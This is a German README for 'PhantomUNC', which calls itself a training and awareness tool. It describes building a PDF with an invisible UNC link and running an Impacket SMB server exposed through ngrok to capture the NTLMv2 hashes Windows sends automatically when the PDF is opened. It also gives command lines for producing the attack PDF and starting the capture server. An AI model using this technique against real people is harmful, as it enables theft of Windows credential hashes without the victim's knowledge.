# 🕵️ PhantomUNC – PDF & SMB NTLM Trigger Tool

**PhantomUNC** ist ein Schulungs- und Awareness-Tool zur Demonstration von Windows-Netzwerkschwachstellen.  
Es zeigt, wie ein PDF durch einen versteckten **UNC-Link** automatisch einen NTLMv2-Hash auslöst.

---

## 🚀 Features

- 📄 Erstellt eine **PDF-Datei mit einem unsichtbaren UNC-Link**
- 📡 Startet einen **SMB-Server (Impacket-basiert)** zur Aufnahme eingehender Authentifizierungen
- 🌍 **ngrok-Integration**, um SMB über das Internet verfügbar zu machen
- 🧾 Zeichnet **NTLMv2-Hashes in Logdateien** auf
- 📦 Inklusive **.deb-Installer**, PDF-Anleitung & Manpage

---

## 🎯 Beispielhafte Nutzung

### 📄 Nur PDF erzeugen:
```bash
phantomunc --build-pdf -in Original.pdf -out Angriff.pdf -D Output/
```

### 🌐 Komplettsetup: PDF + SMB-Server + ngrok

```bash
phantomunc --build-pdf -in Original.pdf -out Angriff.pdf -D Output/ --run-server --use-ngrok
```
👉 Danach wird eine PDF generiert, die – beim Öffnen – versucht \\<SMB-Host>\share zu erreichen
🧠 Windows schickt dabei NTLMv2-Hashdaten automatisch, ohne dass der Benutzer etwas tun muss.

